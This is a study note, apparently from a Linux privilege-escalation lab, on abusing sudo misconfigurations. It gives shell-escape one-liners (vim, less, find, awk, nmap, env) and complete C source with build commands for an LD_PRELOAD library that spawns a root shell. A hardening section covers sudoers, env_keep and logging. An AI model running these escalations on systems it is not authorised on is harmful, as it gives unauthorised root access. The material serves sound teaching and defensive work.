# Linux PrivEsc: Sudo Misconfigurations

> Covers the lab's **Task 6 (Sudo — Shell Escape Sequences)** and **Task 7 (Sudo — Environment Variables)**. Sudo misconfigurations are, in practice, one of the **most common real-world privilege escalation vectors** — far more common than kernel exploits — because `sudo` is deployed everywhere and its configuration (`/etc/sudoers`) is easy to get wrong.

---

## 0. Foundations: How `sudo` Privilege Delegation Works

`sudo` lets an administrator grant specific users permission to run specific commands **as another user** (usually root) — ideally **without** handing out the actual root password. The rules live in `/etc/sudoers` (edited safely via `visudo`) or drop-in files under `/etc/sudoers.d/`.

**Always start every sudo-related enumeration with:**
```bash
sudo -l
```
This lists exactly what commands your current user is allowed to run via `sudo`, and under what conditions (password required or not — `NOPASSWD`).

Example finding:
```
User user may run the following commands on debian:
    (root) NOPASSWD: /usr/bin/env
```

The entire game of "sudo privesc" is: **given this specific allowed command, how do I make it do something the sysadmin didn't intend?**

> 🌐 **Essential resource:** [GTFOBins](https://gtfobins.github.io/) — a curated, searchable database of Unix binaries and exactly how to abuse them for privilege escalation when they're runnable via `sudo`, have the SUID bit, etc. **Bookmark it. You will use it on every real engagement.** This note explains the underlying *mechanisms*; GTFOBins is your fast lookup table once you already understand *why* they work.

---

## Technique A — Shell Escape Sequences (Task 6)

### The Core Idea
Many legitimate administrative tools — text editors, pagers, file managers — have a **"drop to shell"** feature built in for convenience (e.g., a text editor letting you run a quick shell command without leaving the editor). If such a tool is runnable via `sudo`, that built-in shell-drop feature inherits **root's privileges**, because the entire program was launched as root by `sudo` in the first place.

### Classic Examples

**1. `vim` / `vi`** — if allowed via sudo:
```bash
sudo vim -c ':!/bin/bash'
```
or, once inside vim:
```
:!/bin/bash
```
or via vim's shell-escape shortcut:
```
:shell
```

**2. `less` / `more` (pagers)** — often reached indirectly, e.g. via `man` or `git log` piping to a pager:
```bash
sudo less /etc/hosts
# once inside less, press:
!/bin/bash
```

**3. `find`** — one of the most famous, because `find` is often "harmlessly" whitelisted for legitimate file-search tasks:
```bash
sudo find . -exec /bin/bash \; -quit
```

**4. `awk`**:
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**5. `nmap` (older versions with the deprecated interactive mode)**:
```bash
sudo nmap --interactive
nmap> !sh
```

### Why This Works — The Underlying Principle

`sudo` doesn't sandbox what a program does internally once it's launched — it only controls **whether the program is allowed to start**, running with root's UID/GID from that point forward. If the program itself offers **any** mechanism to spawn a subprocess (a shell, an editor's macro system, a scripting hook), that subprocess is spawned with the **same elevated privileges** as its parent. `sudo` has no visibility into "but this shell was spawned *from inside* the allowed program, not by the user directly."

> 🧠 **Mental model:** *"If I can get sudo to start a program, and that program can start another program for me, I've effectively used sudo to start ANY program — including a shell."*

---

## Technique B — Environment Variables (Task 7)

### The Core Idea
By default, `sudo` **sanitizes most environment variables** before running a command, to prevent exactly this kind of abuse. But administrators sometimes configure exceptions — either explicitly (`env_keep` in `sudoers`) or by allowing execution of binaries like `/usr/bin/env` itself, which **exists specifically to launch other programs with a controlled/modified environment.**

### Exploiting `env` in the Sudoers File

If `sudo -l` shows something like:
```
(root) NOPASSWD: /usr/bin/env
```

Then:
```bash
sudo env /bin/bash
```

`env`'s entire job is "run the given command with this environment" — and since `sudo` already elevated `env` itself to root, the command `env` launches (`/bin/bash`) inherits that same root context. **Instant root shell.**

### Exploiting `LD_PRELOAD` (a related, very famous technique)

If `sudoers` has been configured with:
```
Defaults env_keep += LD_PRELOAD
```
...then an attacker can compile a malicious shared library and force it to be loaded into *any* sudo-run process:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/path/to/shell.so <any_command_allowed_via_sudo>
```

The `_init()` function runs automatically the moment the shared library is loaded — **before the target program's own `main()` even starts** — so you get a root shell before the "real" allowed command ever executes.

### Exploiting `LD_LIBRARY_PATH`

Similar idea: if `LD_LIBRARY_PATH` is preserved (`env_keep`) and the sudo-allowed binary dynamically links a library **without** an absolute/hardened path, you can point `LD_LIBRARY_PATH` at a directory containing your own malicious version of that library.

### Checking What's Preserved

```bash
sudo -l
```
Look explicitly for `env_keep` entries, or just try:
```bash
env | sudo -l   # (conceptually) — better: check /etc/sudoers directly if readable
```

---

## Side-by-Side: Why Both Techniques Exist

| Technique | Exploits... | Root Cause |
|---|---|---|
| Shell escape sequences | The **allowed program's own functionality** | `sudo` only gates *program launch*, not what the program does afterward |
| Environment variable abuse | **`sudo`'s environment-passing configuration** | Administrators loosened `env_keep`/`secure_path` defaults, or allowed `env` itself |

Both ultimately reduce to the same lesson: **"sudo access to *any* sufficiently flexible program is equivalent to full root access."** This is why the sudoers philosophy of least privilege insists on being extremely narrow and specific (e.g., allowing `sudo /usr/bin/systemctl restart nginx` — a *fixed*, non-flexible invocation — rather than a bare, argument-flexible binary).

---

## Blue Team / Defensive Notes

1. **Never grant `NOPASSWD` (or even passworded) sudo access to general-purpose interpreters/editors** (`vim`, `less`, `awk`, `python`, `perl`, `find`, `env`, `nmap`, etc.) unless absolutely unavoidable — and if unavoidable, use **fixed argument restrictions** in sudoers (e.g., `sudo/usr/bin/vim /etc/specific_file_only.conf`, and even then, know it's still risky with vim specifically due to `:!`).
2. **Always cross-check any sudo rule against GTFOBins before deploying it** — if the binary appears there with a "sudo" bypass listed, don't allow it broadly.
3. **Keep `env_reset` enabled** (it's the secure default) and **avoid adding to `env_keep`** unless you fully understand the implications — especially never keep `LD_PRELOAD` or `LD_LIBRARY_PATH`.
4. **Use `sudo`'s logging** (`Defaults log_output`, or integrate with `auditd`/a SIEM) to capture full session transcripts of privileged commands — this won't *prevent* abuse but massively aids detection and incident response.
5. **Regularly audit `/etc/sudoers` and `/etc/sudoers.d/`** as part of configuration management (Ansible/Puppet/Chef drift detection) — sudoers sprawl (one-off rules added "temporarily" and never removed) is one of the most common real-world findings in penetration tests.

---

## Command Quick Reference

```bash
# Always start here
sudo -l

# Shell escapes (examples — check GTFOBins for the specific binary you find)
sudo vim -c ':!/bin/bash'
sudo find . -exec /bin/bash \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'

# Environment variable abuse
sudo env /bin/bash

# LD_PRELOAD (if env_keep includes it)
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/path/shell.so <allowed_command>
```

**Always confirm the underlying entry for any binary you find at:**
👉 https://gtfobins.github.io/
